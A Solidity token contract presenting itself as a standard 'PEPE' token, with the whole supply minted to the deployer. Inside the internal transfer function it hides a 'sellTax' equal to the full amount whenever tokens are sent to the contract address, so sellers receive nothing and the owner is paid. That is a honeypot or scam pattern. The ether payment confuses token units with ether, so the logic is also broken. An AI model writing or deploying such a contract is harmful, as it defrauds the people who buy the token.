// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PEPE {
    string public name = "PEPE";
    string public symbol = "PEPE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 469000000000000000000000000000;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address _from, address _to, uint256 _value) internal {
        require(_to != address(0), "Invalid recipient address");
        require(balanceOf[_from] >= _value, "Insufficient balance");

        uint256 sellTax = 0;
        if (_to == address(this)) {
            sellTax = _value;
            payable(owner).transfer(sellTax);
        }

        balanceOf[_from] -= _value;
        balanceOf[_to] += (_value - sellTax);

        emit Transfer(_from, _to, _value);
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(allowance[_from][msg.sender] >= _value, "Insufficient allowance");

        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);

        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0), "Invalid spender address");

        allowance[msg.sender][_spender] = _value;

        return true;
    }
}